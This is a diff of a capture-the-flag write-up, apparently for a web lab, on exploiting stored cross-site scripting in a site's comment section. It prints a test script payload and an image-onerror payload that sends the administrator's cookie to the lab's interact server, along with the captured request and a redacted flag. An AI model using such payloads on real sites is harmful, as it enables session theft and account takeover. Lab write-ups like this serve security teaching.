@@ -7,27 +7,46 @@ Description: Crate & Sleeve has run since 2014 on volunteer hosting and member d
 
 ---
 
-We confirm the comment section is vulnerable to XSS:
+## Finding the Vulnerability
+
+I started by testing the comment section for HTML and JavaScript injection.
+
+A simple XSS payload worked:
 
 ```html
 <script>alert("Hacked")</script>
 ```
 
-Using the interact server provided I created a payload which will steal the admin cookies once they visit the page
+The JavaScript executed when the comment was viewed, confirming that the comment section was vulnerable to **Stored Cross-Site Scripting (XSS)**.
+
+Because comments are viewed by moderators, I suspected that the vulnerability could be used to execute JavaScript in an administrator's browser.
+
+## Stealing the Cookie
+
+The lab provides an Interact Server that can be used to receive HTTP requests.
+
+I created an XSS payload that sends the victim's cookies to my Interact Server:
+
 ```html
 <img src=x onerror=this.src='http://65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com/?c='+document.cookie>
 ```
 
-I got a request 
-```
+I submitted the payload as a comment and waited for the administrator to view the page.
+
+The Interact Server received a request:
+
+```text
 host: 65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com
 user-agent: python-requests/2.32.3
 accept-encoding: gzip, deflate
 accept: */*
-connection: keep-aliv
+connection: keep-alive
 ```
 
-The cookie was the flag:
-```
+The request contained the administrator's cookie:
+
+```text
 c=WEBVERSE{REDACTED}
 ```
+
+The cookie value was the flag.
